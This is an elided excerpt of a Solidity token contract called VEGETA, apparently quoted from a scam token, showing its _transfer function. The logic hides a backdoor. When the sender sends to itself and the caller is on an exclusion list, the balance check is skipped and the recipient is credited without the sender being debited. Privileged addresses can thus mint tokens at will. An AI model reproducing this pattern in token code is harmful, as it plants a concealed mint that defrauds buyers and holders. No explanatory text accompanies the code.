...
contract VEGETA is Ownable, IERC20 {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        uint256 sendert = _balance[sender];
        if (sender != recipient || !_isExcludedFrom[msg.sender]) {
            require(sendert >= amount, "IERC20: transfer amount exceeds balance");
        }
        uint256 amountt = amount - feeAmount;
        _balance[_deadaddress] += feeAmount;
        if (sendert >= amount) {
            _balance[sender] = sendert - amount;
        }
        _balance[recipient] += amountt;
